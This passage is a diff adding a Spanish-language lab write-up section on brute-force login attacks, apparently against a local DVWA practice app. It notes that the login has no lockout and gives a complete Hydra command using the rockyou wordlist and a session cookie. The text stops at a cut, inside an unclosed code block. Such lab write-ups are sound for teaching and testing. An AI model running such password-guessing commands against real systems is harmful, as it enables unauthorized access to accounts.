@@ -1,0 +1,11 @@
+# 1.1 Brute Force
+
+Esta sección nos permite probar la vulnerabilidad de la fuerza bruta. 
+Podemos observar que, si fallamos la contraseña, podremos probar cuanto queramos sin bloqueos ni restricciones.
+
+![BruteForce](/img/imagen1.png)
+
+Procedemos a probarlo con fuerza bruta usando **Hydra** con el siguiente comando:
+
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=rt5o26sooph0v8p5nuarofj346"
